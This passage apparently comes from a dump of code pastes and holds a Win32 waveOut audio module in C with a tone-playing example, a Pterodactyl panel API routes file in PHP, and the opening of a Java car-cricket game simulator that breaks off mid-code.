   3: waveOutUnprepareHeader returned MMSYSERR_INVALHANDLE (Specified handle is invalid)
   4: waveOutUnprepareHeader returned MMSYSERR_NODRIVER (No device driver is present)
   5: waveOutUnprepareHeader returned MMSYSERR_NOMEM (Unable to allocate or lock memory)
   6: waveOutUnprepareHeader returned WAVERR_STILLPLAYING (There are still buffers in the queue)
   7: waveOutClose returned MMSYSERR_INVALHANDLE
   8: waveOutClose returned MMSYSERR_NODRIVER
   9: waveOutClose returned MMSYSERR_NOMEM
   10: waveOutClose returned WAVERR_STILLPLAYING (There are still buffers in the queue)
   \endverbatim
 */
//extern uint32_t kit_audioWaveOutClose(kit_audioDevice** device_p);


#endif



#  endif
#endif"
JnG4279H,kit_w32_audio.c with winmm,Kitomas,C,Thursday 29th of June 2023 08:15:03 PM CDT,"//(compile with kernel32, ole32, and optionally winmm (define ""KIT_AUDIO_USE_WINMM"" to use waveIn/Out functionality)
 /**
  * \file kit_w32_audio.c
  * \brief Header file for KIT Win32's audio module
  */
#ifndef KIT_AUDIO_USE_WINMM
#  define KIT_AUDIO_USE_WINMM
#endif
#include <kit_w32_audio.h>


static inline int _kit_audioCountBits(long long unsigned int bitState){
  int bitCount=0;
  while(bitState){ bitCount+=bitState&1; bitState>>=1; }
  return bitCount;
}



/* WASAPI */



/* WINMM */
#ifdef KIT_AUDIO_USE_WINMM


//thread process to trigger user-defined callback, before writing to waveOut
DWORD WINAPI _kit_audioWaveOutFillBuffer(LPVOID device_void_ptr){
  kit_audioDevice* device=device_void_ptr;
  KIT_AUDIO_AUDITANDLOCK(device,KIT_AUDIO_DEVTYPE_WAVEOUT,0);
  device->src.callback(device->src.userdata,
                       device->_stream,
                       device->src.buffer_len
  );
  unsigned int buffer_len=device->cvt.buffer_len, which=device->_which;
  uint8_t* dst_u8; int16_t* dst_i16; float* src_flt;
  float vol_l=device->volume[0], vol_r=device->volume[device->src.channels-1];
  switch(device->src.format){
  case KIT_AUDIO_FMT_U8:
    dst_u8=device->_buffer[which];
    memcpy(dst_u8, device->_stream, device->cvt.buffer_size);
    for(unsigned int i=0; i<buffer_len;){
      dst_u8[i]*=vol_l; ++i;
      dst_u8[i]*=vol_r; ++i;
    }
    break;
  case KIT_AUDIO_FMT_I16:
    dst_i16=device->_buffer[which];
    memcpy(dst_i16, device->_stream, device->cvt.buffer_size);
    for(unsigned int i=0; i<buffer_len;){
      dst_i16[i]*=vol_l; ++i;
      dst_i16[i]*=vol_r; ++i;
    }
    break;
  case KIT_AUDIO_FMT_F32: //internally converted to i16
    src_flt=device->_stream;
    dst_i16=device->_buffer[which];
    for(unsigned int i=0; i<buffer_len;){
      dst_i16[i]=(int16_t)(src_flt[i]*32767.0f*vol_l); ++i;
      dst_i16[i]=(int16_t)(src_flt[i]*32767.0f*vol_r); ++i;
    }
    break;
  default: goto skip; //invalid format
  }
  waveOutWrite(device->_handle_waveOut, &device->_buffer_info[which], sizeof(WAVEHDR));
  device->_which^=1; //switch output buffer for next time this function is called
  skip:
  KIT_AUDIO_UNLOCK(device);
  return 0;
}


void CALLBACK _kit_audioWaveOutProc(HWAVEOUT waveOutHandle, UINT message, DWORD_PTR instance,
                                    DWORD_PTR param1, DWORD_PTR param2){
  kit_audioDevice* device=(kit_audioDevice*)instance;
  switch(message){
  case WOM_CLOSE: //closing has its own function, and is handled separately
  case WOM_OPEN: return;
  case WOM_DONE:
    _KIT_AUDIO_LOCKCALLBACKTHREAD(device);
    _kit_audioWaveOutFillBuffer(device);
    _KIT_AUDIO_UNLOCKCALLBACKTHREAD(device);
  }
}

//public waveout functions

uint32_t kit_audioWaveOutPlay(kit_audioDevice* device, int playState){
  playState&=1; //only keep bit 0
  KIT_AUDIO_AUDITANDLOCK(device,KIT_AUDIO_DEVTYPE_WAVEOUT,MMSYSERR_INVALHANDLE);
  if(device->_playing==playState){ KIT_AUDIO_UNLOCK(device); return MMSYSERR_NOERROR; }
  uint32_t result;
  if(playState) result=waveOutRestart(device->_handle_waveOut);
  else result=waveOutPause(device->_handle_waveOut);
  if(result==MMSYSERR_NOERROR){
    device->_playing=playState;
  }
  KIT_AUDIO_UNLOCK(device);
  return result;
}

/* bah humbug i'll do this later
uint32_t kit_audioWaveOutReset(kit_audioDevice* device){//, uint32_t timeoutMilliseconds){
  KIT_AUDIO_IFDEVICEINVALID(device,KIT_AUDIO_DEVTYPE_WAVEOUT) return MMSYSERR_INVALHANDLE;
  _KIT_AUDIO_LOCKCALLBACKTHREAD(device);
   //i'll implement an actual timeout later
   //if(!timeoutMilliseconds) timeoutMilliseconds=device->_callback_timeout;
  uint32_t result=0;
  if(device->_callback_thread != NULL){
    result=WaitForSingleObject(device->_callback_thread,INFINITE);//(DWORD)timeoutMilliseconds);
    CloseHandle(device->_callback_thread);
  }
  device->_callback_thread=NULL;
  _KIT_AUDIO_UNLOCKCALLBACKTHREAD(device);
  if(result) return result;

  KIT_AUDIO_LOCK(device);
  result=(uint32_t)waveOutReset(device->_handle_waveOut);
  if(result == MMSYSERR_NOERROR){
    device->_playing=0;
    KIT_AUDIO_UNLOCK(device);
    //
    _KIT_AUDIO_LOCKCALLBACKTHREAD(device);
    HANDLE thread=CreateThread(NULL,0,_kit_audioWaveOutFillBuffer,(LPVOID)device,0,NULL);
    CloseHandle(thread); //close handle to thread immediately
    device->_callback_thread=CreateThread(NULL,0,_kit_audioWaveOutFillBuffer,(LPVOID)device,0,NULL);
    _KIT_AUDIO_UNLOCKCALLBACKTHREAD(device);
  } else KIT_AUDIO_UNLOCK(device);
  return result;
}*/


#define _kit_audioWaveOutOpenERROR(_condition,_rcode,_before) \
  if(_condition){ _before; returnStatus=_rcode; goto skip; }
kit_audioDevice* kit_audioWaveOutOpen(kit_audioSpec* desiredSpec, uint32_t deviceID, int* returnStatus_ptr){
  int returnStatus=0;
  //allocate space for device struct
  kit_audioDevice* device=_kit_audioMalloc(kit_audioDevice,1);
  _kit_audioWaveOutOpenERROR(!device,1,;);
  _kit_audioWaveOutOpenERROR(desiredSpec->callback==NULL,2,_kit_audioFree(device));
  memset(device,0,sizeof(kit_audioDevice));
  device->_magic.num=0x007665446F69647561; //=""audioDev\x00""
  device->device_type=KIT_AUDIO_DEVTYPE_WAVEOUT;
  device->cvt = device->src = *desiredSpec; //copy spec info

  //fetch capabilities of device
  switch(waveOutGetDevCaps(deviceID,&device->_waveOutCaps,sizeof(WAVEOUTCAPS))){
  case MMSYSERR_BADDEVICEID: _kit_audioWaveOutOpenERROR(1,3,_kit_audioFree(device)); break;
  case MMSYSERR_NODRIVER:    _kit_audioWaveOutOpenERROR(1,4,_kit_audioFree(device)); break;
  case MMSYSERR_NOMEM:       _kit_audioWaveOutOpenERROR(1,5,_kit_audioFree(device)); break;
  case MMSYSERR_NOERROR:; //continue as normal
  }
  _kit_audioWaveOutOpenERROR(!device->_waveOutCaps.dwFormats,6,_kit_audioFree(device));

  //is buffer_len a power of 2 (and not equal to 0)?
  _kit_audioWaveOutOpenERROR(!desiredSpec->buffer_len,7,_kit_audioFree(device));
  _kit_audioWaveOutOpenERROR(_kit_audioCountBits(desiredSpec->buffer_len)!=1,8,_kit_audioFree(device));

  //simplify type of spec
  union { struct {
    uint8_t   dataType : 1; //0, 1  =  signed 8-bit, signed 16-bit (float handled separately)
    uint8_t   channels : 1; //0, 1  =  mono, stereo
    uint8_t  frequency : 2; //0, 1, 2, 3  =  11025, 22050, 44100, 96000 kHz
    uint8_t   _padding : 4;
   }; uint8_t value;
  } audioSpec={.value=0};
   //check sample rate
  switch(desiredSpec->frequency){
  case 11025: audioSpec.frequency=0; break;
  case 22050: audioSpec.frequency=1; break;
  case 44100: audioSpec.frequency=2; break;
  case 96000: audioSpec.frequency=3; break;
  default: _kit_audioWaveOutOpenERROR(1,9,_kit_audioFree(device));
  }
   //check number of channels
  switch(desiredSpec->channels){
  case 1: audioSpec.channels=0; break;
  case 2: audioSpec.channels=1; break;
  default: _kit_audioWaveOutOpenERROR(1,10,_kit_audioFree(device));
  }
   //check data type (and calculate buffer_size, now that the data type is known)
  device->src.buffer_size=device->src.buffer_len;
  device->cvt.buffer_size=device->cvt.buffer_len;
  switch(desiredSpec->format){
  case KIT_AUDIO_FMT_U8: audioSpec.dataType=0; break;
  case KIT_AUDIO_FMT_F32: //internally converted to int16 before passing to waveOutWrite
    device->src.buffer_size<<=1;
    device->cvt.format=KIT_AUDIO_FMT_I16;
    device->_cvt_needed=1;
  case KIT_AUDIO_FMT_I16:
    device->src.buffer_size<<=1;
    device->cvt.buffer_size<<=1;
    audioSpec.dataType=1;
    break;
  default: _kit_audioWaveOutOpenERROR(1,11,_kit_audioFree(device));
  }

  //compare simplified spec with device capabilities
  DWORD caps_fmt=device->_waveOutCaps.dwFormats;
  switch(audioSpec.value){
  case 0b0000: _kit_audioWaveOutOpenERROR(!(caps_fmt&WAVE_FORMAT_1M08 ),12,_kit_audioFree(device)); break; //0: 11025Hz,   mono,  8-bit
  case 0b0001: _kit_audioWaveOutOpenERROR(!(caps_fmt&WAVE_FORMAT_1M16 ),13,_kit_audioFree(device)); break; //1: 11025Hz,   mono, 16-bit
  case 0b0010: _kit_audioWaveOutOpenERROR(!(caps_fmt&WAVE_FORMAT_1S08 ),14,_kit_audioFree(device)); break; //2: 11025Hz, stereo,  8-bit
  case 0b0011: _kit_audioWaveOutOpenERROR(!(caps_fmt&WAVE_FORMAT_1S16 ),15,_kit_audioFree(device)); break; //3: 11025Hz, stereo, 16-bit
  case 0b0100: _kit_audioWaveOutOpenERROR(!(caps_fmt&WAVE_FORMAT_2M08 ),16,_kit_audioFree(device)); break; //4: 22050Hz,   mono,  8-bit
  case 0b0101: _kit_audioWaveOutOpenERROR(!(caps_fmt&WAVE_FORMAT_2M16 ),17,_kit_audioFree(device)); break; //5: 22050Hz,   mono, 16-bit
  case 0b0110: _kit_audioWaveOutOpenERROR(!(caps_fmt&WAVE_FORMAT_2S08 ),18,_kit_audioFree(device)); break; //6: 22050Hz, stereo,  8-bit
  case 0b0111: _kit_audioWaveOutOpenERROR(!(caps_fmt&WAVE_FORMAT_2S16 ),19,_kit_audioFree(device)); break; //7: 22050Hz, stereo, 16-bit
  case 0b1000: _kit_audioWaveOutOpenERROR(!(caps_fmt&WAVE_FORMAT_4M08 ),20,_kit_audioFree(device)); break; //8: 44100Hz,   mono,  8-bit
  case 0b1001: _kit_audioWaveOutOpenERROR(!(caps_fmt&WAVE_FORMAT_4M16 ),21,_kit_audioFree(device)); break; //9: 44100Hz,   mono, 16-bit
  case 0b1010: _kit_audioWaveOutOpenERROR(!(caps_fmt&WAVE_FORMAT_4S08 ),22,_kit_audioFree(device)); break; //A: 44100Hz, stereo,  8-bit
  case 0b1011: _kit_audioWaveOutOpenERROR(!(caps_fmt&WAVE_FORMAT_4S16 ),23,_kit_audioFree(device)); break; //B: 44100Hz, stereo, 16-bit
  case 0b1100: _kit_audioWaveOutOpenERROR(!(caps_fmt&WAVE_FORMAT_96M08),24,_kit_audioFree(device)); break; //C: 96000Hz,   mono,  8-bit
  case 0b1101: _kit_audioWaveOutOpenERROR(!(caps_fmt&WAVE_FORMAT_96M16),25,_kit_audioFree(device)); break; //D: 96000Hz,   mono, 16-bit
  case 0b1110: _kit_audioWaveOutOpenERROR(!(caps_fmt&WAVE_FORMAT_96S08),26,_kit_audioFree(device)); break; //E: 96000Hz, stereo,  8-bit
  case 0b1111: _kit_audioWaveOutOpenERROR(!(caps_fmt&WAVE_FORMAT_96S16),27,_kit_audioFree(device)); break; //F: 96000Hz, stereo, 16-bit
  }

  //copy spec info more and prepare device struct more
   //set up WAVEFORMATEX
  device->_info.Format.wFormatTag    =WAVE_FORMAT_PCM;
  device->_info.Format.nChannels     =desiredSpec->channels;
  device->_info.Format.nSamplesPerSec=desiredSpec->frequency;
  device->_info.Format.nBlockAlign   =(audioSpec.dataType+1)*desiredSpec->channels;
  device->_info.Format.wBitsPerSample=(audioSpec.dataType+1)*8;
  device->_info.Format.cbSize        =0;
   //allocate buffers
  device->_stream =_kit_audioMalloc(char,device->src.buffer_size);
  _kit_audioWaveOutOpenERROR(device->_stream==NULL,28, //device
                             _kit_audioFree(device));
  device->_buffer[0]=_kit_audioMalloc(char,device->cvt.buffer_size);
  _kit_audioWaveOutOpenERROR(device->_buffer[0]==NULL,29, //_stream, device
                             _kit_audioFree(device->_stream);
                             _kit_audioFree(device));
  device->_buffer[1]=_kit_audioMalloc(char,device->cvt.buffer_size);
  _kit_audioWaveOutOpenERROR(device->_buffer[1]==NULL,30, //_buffer[0], _stream, device
                             _kit_audioFree(device->_buffer[0]);
                             _kit_audioFree(device->_stream);
                             _kit_audioFree(device));
  device->volume=_kit_audioMalloc(float,device->src.channels);
  _kit_audioWaveOutOpenERROR(device->volume==NULL,31, //_buffer[1], _buffer[0], _stream, device
                             _kit_audioFree(device->_buffer[1]);
                             _kit_audioFree(device->_buffer[0]);
                             _kit_audioFree(device->_stream);
                             _kit_audioFree(device));
  #define _kit_audioWaveOutOpenERRORB(_condition,_rcode,_before) \
    _kit_audioWaveOutOpenERROR(_condition,_rcode, \
                               _kit_audioFree(device->volume); \
                               _kit_audioFree(device->_buffer[1]); \
                               _kit_audioFree(device->_buffer[0]); \
                               _kit_audioFree(device->_stream); \
                               _kit_audioFree(device); _before);

  //actually open the device
  switch(waveOutOpen(
    &device->_handle_waveOut,
    deviceID,
    &device->_info.Format, //holds the WAVEFORMATEX struct
    (DWORD_PTR)_kit_audioWaveOutProc, //internal callback
    (DWORD_PTR)device, //user data
    CALLBACK_FUNCTION
  )){ //(MMSYSERR_BADDEVICEID was already handled by waveOutGetDevCaps)
  case MMSYSERR_ALLOCATED: _kit_audioWaveOutOpenERRORB(1,32,;); break;
  case MMSYSERR_NODRIVER:  _kit_audioWaveOutOpenERRORB(1,33,;); break;
  case MMSYSERR_NOMEM:     _kit_audioWaveOutOpenERRORB(1,34,;); break;
  case WAVERR_BADFORMAT:   _kit_audioWaveOutOpenERRORB(1,35,;); break;
  case WAVERR_SYNC:        _kit_audioWaveOutOpenERRORB(1,36,;); break;
  case MMSYSERR_NOERROR: waveOutPause(device->_handle_waveOut);
  }

  //set relevant WAVEHDR info (rest is handled by waveOutPrepareHeader)
  for(int i=0; i<2; ++i){
    device->_buffer_info[i].lpData=device->_buffer[i];
    device->_buffer_info[i].dwBufferLength=device->cvt.buffer_size;
    waveOutPrepareHeader(device->_handle_waveOut,&device->_buffer_info[i],sizeof(WAVEHDR));
  }

  //initialize mutexes
  InitializeCriticalSection(&device->_mutex);
  InitializeCriticalSection(&device->_callback_mutex);
  //default 10-second timeout, which i should probably edit and add parameters for later
  device->callback_timeout=10000;
  //set volumes to 1
  for(int i=0; i<=audioSpec.channels; ++i) device->volume[i]=1.0f;
  waveOutSetVolume(device->_handle_waveOut,0xFFFFFFFF);

  //preemptively fill output buffers
  _KIT_AUDIO_LOCKCALLBACKTHREAD(device);
  HANDLE firstThread=CreateThread(NULL,0,_kit_audioWaveOutFillBuffer,(LPVOID)device,0,NULL);
  CloseHandle(firstThread);
  device->_callback_thread=CreateThread(NULL,0,_kit_audioWaveOutFillBuffer,(LPVOID)device,0,NULL);
  _KIT_AUDIO_UNLOCKCALLBACKTHREAD(device);

  //wrap things up
  skip:
  if(returnStatus_ptr != NULL) *returnStatus_ptr=returnStatus;
  if(returnStatus==0) return device;
  else return NULL;
}

/* can't get waveOutReset to work :(
#define _kit_audioWaveOutCloseERROR(_rcode) \
  { returnStatus=(_rcode); goto skip; }
uint32_t kit_audioWaveOutClose(kit_audioDevice** device_p){
  printf(""function start\n"");
  Sleep(50);
  //make sure bad things don't happen if attempting to close device twice
  if(device_p == NULL){
    return 1;
  }
  kit_audioDevice* device=*device_p;
  printf(""%p\n"",device->_handle_waveOut);
  KIT_AUDIO_AUDITANDLOCK(device,KIT_AUDIO_DEVTYPE_WAVEOUT,2);


  //MMRESULT resetResult=waveOutReset(device->_handle_waveOut);
  //printf(""resetResult=%u\n"",resetResult);

  uint32_t returnStatus=0;
  for(int i=0; i<2; ++i){
    switch(waveOutUnprepareHeader(device->_handle_waveOut,&device->_buffer_info[i],sizeof(WAVEHDR))){
    case MMSYSERR_INVALHANDLE: _kit_audioWaveOutCloseERROR(3);
    case MMSYSERR_NODRIVER:    _kit_audioWaveOutCloseERROR(4);
    case MMSYSERR_NOMEM:       _kit_audioWaveOutCloseERROR(5);
    case WAVERR_STILLPLAYING:  _kit_audioWaveOutCloseERROR(6);
    case MMSYSERR_NOERROR:;
    }
  }
  switch(waveOutClose(device->_handle_waveOut)){
  case MMSYSERR_INVALHANDLE: _kit_audioWaveOutCloseERROR(7);
  case MMSYSERR_NODRIVER:    _kit_audioWaveOutCloseERROR(8);
  case MMSYSERR_NOMEM:       _kit_audioWaveOutCloseERROR(9);
  case WAVERR_STILLPLAYING:  _kit_audioWaveOutCloseERROR(10);
  case MMSYSERR_NOERROR:;
  }

  _kit_audioFree(device->volume);
  _kit_audioFree(device->_buffer[1]);
  _kit_audioFree(device->_buffer[0]);
  _kit_audioFree(device->_stream);

  skip:
  KIT_AUDIO_UNLOCK(device);
  if(!returnStatus){
    _kit_audioFree(device);
    *device_p=NULL;
  }
  return returnStatus;
}*/


#endif"
8ZyLWF7w,using kit_w32_audio's waveOut functionality,Kitomas,C,Thursday 29th of June 2023 08:12:41 PM CDT,"#include <combaseapi.h>
#include <stdint.h>
#include <math.h>

#define KIT_AUDIO_USE_WINMM
#include <kit_w32.h>

extern int printf(const char* __format, ...);

float getSinSample(){
  static int sample=0;
  float value=sinf(PI*2*440*((float)sample/11025));
  ++sample;
  return value;
}

void callback(void* userdata, void* stream, unsigned int len){
  float* stream_flt=stream;
  for(unsigned int i=0; i<len; ++i) stream_flt[i]=getSinSample();
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR args, int nCmdShow){
  kit_audioSpec spec;
  spec.callback=callback;
  spec.buffer_len=4096;
  spec.frequency=11025;
  spec.channels=1;
  spec.format=KIT_AUDIO_FMT_F32;

  int returnStatus;
  kit_audioDevice* device=kit_audioWaveOutOpen(&spec,-1,&returnStatus);
  if(!device){ printf(""returnStatus=%i\n"",returnStatus); return 0; }

  kit_audioWaveOutPlay(device,1);
  Sleep(1000);

  //you'd then close the device (if only waveOutReset worked...)

  return 0;
}"
gpHXBuVr,api-client.php,DraneLixX,PHP,Thursday 29th of June 2023 07:43:47 PM CDT,"<?php

use Illuminate\Support\Facades\Route;
use Pterodactyl\Http\Controllers\Api\Client;
use Pterodactyl\Http\Middleware\Activity\ServerSubject;
use Pterodactyl\Http\Middleware\Activity\AccountSubject;
use Pterodactyl\Http\Middleware\RequireTwoFactorAuthentication;
use Pterodactyl\Http\Middleware\Api\Client\Server\ResourceBelongsToServer;
use Pterodactyl\Http\Middleware\Api\Client\Server\AuthenticateServerAccess;

/*
|--------------------------------------------------------------------------
| Client Control API
|--------------------------------------------------------------------------
|
| Endpoint: /api/client
|
*/
Route::get('/', [Client\ClientController::class, 'index'])->name('api:client.index');
Route::get('/permissions', [Client\ClientController::class, 'permissions']);

Route::prefix('/account')->middleware(AccountSubject::class)->group(function () {
    Route::prefix('/')->withoutMiddleware(RequireTwoFactorAuthentication::class)->group(function () {
        Route::get('/', [Client\AccountController::class, 'index'])->name('api:client.account');
        Route::get('/two-factor', [Client\TwoFactorController::class, 'index']);
        Route::post('/two-factor', [Client\TwoFactorController::class, 'store']);
        Route::delete('/two-factor', [Client\TwoFactorController::class, 'delete']);
    });

    Route::put('/email', [Client\AccountController::class, 'updateEmail'])->name('api:client.account.update-email');
    Route::put('/password', [Client\AccountController::class, 'updatePassword'])->name('api:client.account.update-password');

    Route::get('/activity', Client\ActivityLogController::class)->name('api:client.account.activity');

    Route::get('/api-keys', [Client\ApiKeyController::class, 'index']);
    Route::post('/api-keys', [Client\ApiKeyController::class, 'store']);
    Route::delete('/api-keys/{identifier}', [Client\ApiKeyController::class, 'delete']);

    Route::prefix('/ssh-keys')->group(function () {
        Route::get('/', [Client\SSHKeyController::class, 'index']);
        Route::post('/', [Client\SSHKeyController::class, 'store']);
        Route::post('/remove', [Client\SSHKeyController::class, 'delete']);
    });
});

/*
|--------------------------------------------------------------------------
| Client Control API
|--------------------------------------------------------------------------
|
| Endpoint: /api/client/servers/{server}
|
*/
Route::group([
    'prefix' => '/servers/{server}',
    'middleware' => [
        ServerSubject::class,
        AuthenticateServerAccess::class,
        ResourceBelongsToServer::class,
    ],
], function () {
    Route::get('/', [Client\Servers\ServerController::class, 'index'])->name('api:client:server.view');
    Route::get('/websocket', Client\Servers\WebsocketController::class)->name('api:client:server.ws');
    Route::get('/resources', Client\Servers\ResourceUtilizationController::class)->name('api:client:server.resources');
    Route::get('/activity', Client\Servers\ActivityLogController::class)->name('api:client:server.activity');

    Route::post('/command', [Client\Servers\CommandController::class, 'index']);
    Route::post('/power', [Client\Servers\PowerController::class, 'index']);

    Route::group(['prefix' => '/databases'], function () {
        Route::get('/', [Client\Servers\DatabaseController::class, 'index']);
        Route::post('/', [Client\Servers\DatabaseController::class, 'store']);
        Route::post('/{database}/rotate-password', [Client\Servers\DatabaseController::class, 'rotatePassword']);
        Route::delete('/{database}', [Client\Servers\DatabaseController::class, 'delete']);
    });

    Route::group(['prefix' => '/files'], function () {
        Route::get('/list', [Client\Servers\FileController::class, 'directory']);
        Route::get('/contents', [Client\Servers\FileController::class, 'contents']);
        Route::get('/download', [Client\Servers\FileController::class, 'download']);
        Route::put('/rename', [Client\Servers\FileController::class, 'rename']);
        Route::post('/copy', [Client\Servers\FileController::class, 'copy']);
        Route::post('/write', [Client\Servers\FileController::class, 'write']);
        Route::post('/compress', [Client\Servers\FileController::class, 'compress']);
        Route::post('/decompress', [Client\Servers\FileController::class, 'decompress']);
        Route::post('/delete', [Client\Servers\FileController::class, 'delete']);
        Route::post('/create-folder', [Client\Servers\FileController::class, 'create']);
        Route::post('/chmod', [Client\Servers\FileController::class, 'chmod']);
        Route::post('/pull', [Client\Servers\FileController::class, 'pull'])->middleware(['throttle:10,5']);
        Route::get('/upload', Client\Servers\FileUploadController::class);
    });

    Route::group(['prefix' => '/schedules'], function () {
        Route::get('/', [Client\Servers\ScheduleController::class, 'index']);
        Route::post('/', [Client\Servers\ScheduleController::class, 'store']);
        Route::get('/{schedule}', [Client\Servers\ScheduleController::class, 'view']);
        Route::post('/{schedule}', [Client\Servers\ScheduleController::class, 'update']);
        Route::post('/{schedule}/execute', [Client\Servers\ScheduleController::class, 'execute']);
        Route::delete('/{schedule}', [Client\Servers\ScheduleController::class, 'delete']);

        Route::post('/{schedule}/tasks', [Client\Servers\ScheduleTaskController::class, 'store']);
        Route::post('/{schedule}/tasks/{task}', [Client\Servers\ScheduleTaskController::class, 'update']);
        Route::delete('/{schedule}/tasks/{task}', [Client\Servers\ScheduleTaskController::class, 'delete']);
    });

    Route::group(['prefix' => '/network'], function () {
        Route::get('/allocations', [Client\Servers\NetworkAllocationController::class, 'index']);
        Route::post('/allocations', [Client\Servers\NetworkAllocationController::class, 'store']);
        Route::post('/allocations/{allocation}', [Client\Servers\NetworkAllocationController::class, 'update']);
        Route::post('/allocations/{allocation}/primary', [Client\Servers\NetworkAllocationController::class, 'setPrimary']);
        Route::delete('/allocations/{allocation}', [Client\Servers\NetworkAllocationController::class, 'delete']);
    });

    Route::group(['prefix' => '/users'], function () {
        Route::get('/', [Client\Servers\SubuserController::class, 'index']);
        Route::post('/', [Client\Servers\SubuserController::class, 'store']);
        Route::get('/{user}', [Client\Servers\SubuserController::class, 'view']);
        Route::post('/{user}', [Client\Servers\SubuserController::class, 'update']);
        Route::delete('/{user}', [Client\Servers\SubuserController::class, 'delete']);
    });

    Route::group(['prefix' => '/backups'], function () {
        Route::get('/', [Client\Servers\BackupController::class, 'index']);
        Route::post('/', [Client\Servers\BackupController::class, 'store']);
        Route::get('/{backup}', [Client\Servers\BackupController::class, 'view']);
        Route::get('/{backup}/download', [Client\Servers\BackupController::class, 'download']);
        Route::post('/{backup}/lock', [Client\Servers\BackupController::class, 'toggleLock']);
        Route::post('/{backup}/restore', [Client\Servers\BackupController::class, 'restore']);
        Route::delete('/{backup}', [Client\Servers\BackupController::class, 'delete']);
    });

    Route::group(['prefix' => '/mods'], function () {
        Route::get('/curse', [Client\Servers\ModsController::class, 'curse']);
        Route::get('/versions', [Client\Servers\ModsController::class, 'versions']);
        Route::get('/description', [Client\Servers\ModsController::class, 'description']);
        Route::get('/mcversions', [Client\Servers\ModsController::class, 'mcversions']);
        Route::post('/install', [Client\Servers\ModsController::class, 'install']);
    });

    Route::group(['prefix' => '/startup'], function () {
        Route::get('/', [Client\Servers\StartupController::class, 'index']);
        Route::put('/variable', [Client\Servers\StartupController::class, 'update']);
    });

    Route::group(['prefix' => '/versions'], function () {
        Route::get('/listversion', [Client\Servers\VersionsController::class, 'listversion']);
        Route::get('/getversionsize', [Client\Servers\VersionsController::class, 'getversionsize']);
        Route::post('/installversion', [Client\Servers\VersionsController::class, 'installversion']);
    });

    Route::group(['prefix' => '/plugins'], function () {
        Route::get('/', [Client\Servers\McPluginsController::class, 'plugins']);
        Route::get('/getVersions', [Client\Servers\McPluginsController::class, 'getVersions']);
        Route::get('/getMcVersions', [Client\Servers\McPluginsController::class, 'getMcVersions']);
        Route::post('/install', [Client\Servers\McPluginsController::class, 'install']);
        Route::post('/uninstall', [Client\Servers\McPluginsController::class, 'uninstall']);
    });
 
    Route::group(['prefix' => '/settings'], function () {
        Route::post('/rename', [Client\Servers\SettingsController::class, 'rename']);
        Route::post('/reinstall', [Client\Servers\SettingsController::class, 'reinstall']);
        Route::put('/docker-image', [Client\Servers\SettingsController::class, 'dockerImage']);
    });
});"
nBmqgG5X,Car Cricket Java,tomdodd4598,Java,Thursday 29th of June 2023 07:43:35 PM CDT,"package dodd;

import java.util.*;
import java.util.function.*;
import java.util.stream.IntStream;

public class Main {

    static class Box<T> {

        T value;

        Box(T value) {
            this.value = value;
        }

        public String toString() {
            return value.toString();
        }
    }

    record Ball(int runs, boolean wicket) {}

    static int mod(int x, int y) {
        return (x % y + y) % y;
    }

    static int strHash(String str) {
        return str.chars().reduce(5381, (acc, x) -> 127 * (acc & 0x00FFFFFF) + x);
    }

    static Iterable<Integer> filteredStr(String str) {
        return () -> str.codePoints().filter(x -> x < 0xFE00 || x > 0xFE0F).iterator();
    }

    static class Team {

        final String name;

        final String coachUpper;
        final String nameUpper;

        final List<String> players = new ArrayList<>();
        final List<String> playersLast = new ArrayList<>();

        final List<Integer> bowl = new ArrayList<>();
        final List<Integer> wk = new ArrayList<>();

        final int uuid;

        Team(String coach, String name, List<String> players) {
            this.name = name;

            coachUpper = coach.toUpperCase(Locale.ROOT);
            nameUpper = name.toUpperCase(Locale.ROOT);

            uuid = strHash(coach + name);

            for (int i = 0; i < 11; ++i) {
                var player = players.get(i);
                var suffix = """";
                if (player.length() >= 4) {
                    suffix = player.substring(0, player.length() - 4).toLowerCase(Locale.ROOT);
                }
                if (suffix.equals(""(wk)"") || suffix.equals(""[wk]"") || suffix.equals(""{wk}"")) {
                    this.wk.add(i);
                } else if (i - wk.size() > 5) {
                    this.bowl.add(i);
                }
                this.players.add(player);

                var split = player.split(""\\s+"");
                this.playersLast.add(split[split.length - 1]);
            }
        }

        String bowler(int count) {
            var test = (count / 6) * this.uuid;
            if (test % 8 == 0) {
                var index = mod(test, 11);
                if (!this.wk.contains(index)) {
                    return this.playersLast.get(index);
                }
            }
            return this.playersLast.get(this.bowl.get(mod(test, this.bowl.size())));
        }
    }

    public static void main(String[] args) {
        final var scanner = new Scanner(System.in);
        
        Supplier<Team> parseTeam = () -> {
            var coach = scanner.nextLine();
            var name = scanner.nextLine();
            scanner.nextLine();
            var players = IntStream.range(0, 11).mapToObj(x -> scanner.nextLine()).toList();
            scanner.nextLine();
            return new Team(coach, name, players);
        };

        IntFunction<String> runsStr = x -> x == 0 ? ""🦆"" : Integer.toString(x);

        final var teams = new Team[] {parseTeam.get(), parseTeam.get()};
        final var teamRuns = new int[] {0, 0};

        final var toss = Integer.parseInt(scanner.nextLine()) - 1;
        final var batting = new Box<>(0);
        final var line = scanner.nextLine().toLowerCase(Locale.ROOT);
        batting.value = line.equals(""bat"") || line.equals(""batting"") ? toss : 1 - toss;
        scanner.nextLine();

        IntSupplier bowling = () -> 1 - batting.value;

        final var count = new Box<>(6 * 123456789);

        final var batterRuns = new Box<>(0);
        // final var batterBalls = new Box<>(0);
        final var totalRuns = new Box<>(0);
        final var totalWickets = new Box<>(0);
        final var wicket = new Box<>(false);
        final var innings = new Box<>(1);
        final var target = new Box<>(0);

        IntFunction<String> runPl = x -> x + "" RUN"" + (x == 1 ? """" : ""S"");

        IntFunction<String> wicketPl = x -> x + "" WICKET"" + (x == 1 ? """" : ""S"");

        Supplier<String> batter = () -> teams[batting.value].players.get(totalWickets.value);

        Supplier<String> bowler = () -> teams[bowling.getAsInt()].bowler(count.value);

        Consumer<Boolean> printBatter = x -> {
            if (x) {
                System.out.println(batter.get() + "" "" + runsStr.apply(batterRuns.value) + "" ("" + bowler.get() + "")"");
            } else {
                System.out.println(batter.get() + "" "" + batterRuns + "" n/o"");
            }
        };

        Runnable printCurrentInnings = () -> {
            printBatter.accept(false);
            for (var i = 1 + totalWickets.value; i < 11; ++i){
                System.out.println(teams[batting.value].players.get(i));
            }
            System.out.println(""\n"" + totalRuns + ""/"" + totalWickets + ""\n"");
        };

        Map<Integer, Ball> ballDict = new HashMap<>();

        BiConsumer<Ball, int[]> putBall = (x, y) -> {
            for (var code : y) {
                ballDict.put(code, x);
            }
        };

        var gone = new Ball(0, true);
        var dot = new Ball(0, false);
        var one = new Ball(1, false);
        var two = new Ball(2, false);
